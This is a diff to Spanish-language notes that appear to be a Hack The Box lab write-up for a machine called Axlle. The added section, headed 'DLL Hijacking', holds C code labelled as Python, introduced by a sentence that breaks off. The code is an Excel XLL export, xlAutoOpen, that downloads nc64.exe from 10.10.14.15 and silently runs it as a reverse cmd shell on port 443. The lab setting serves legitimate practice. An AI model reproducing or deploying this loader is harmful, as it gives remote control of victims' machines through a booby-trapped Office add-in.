@@ -90,6 +90,22 @@ parece que no podemos ver nada explotable en la web. así que vamos a seguir enu
 parece que podemos hacer algún tipo de petición al correo `acconunts@axlle.htb` 
 ![[Pasted image 20240629111401.png]]
 
+### DLL Hijacking
+con este script en python vamos a in
+```python
+#include <windows.h>
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
+__declspec(dllexport) short __stdcall xlAutoOpen()
+{
+HRESULT hr = URLDownloadToFileW(NULL, L"http://10.10.14.15:80/nc64.exe", L"C:\\Windows\\Tasks\\nc64.exe", 0,
+NULL);
+if (SUCCEEDED(hr)) {
+WinExec("C:\\Windows\\Tasks\\nc64.exe -e cmd 10.10.14.15 443", SW_HIDE);
+}
+return 0;
+}
+```
 
 
 
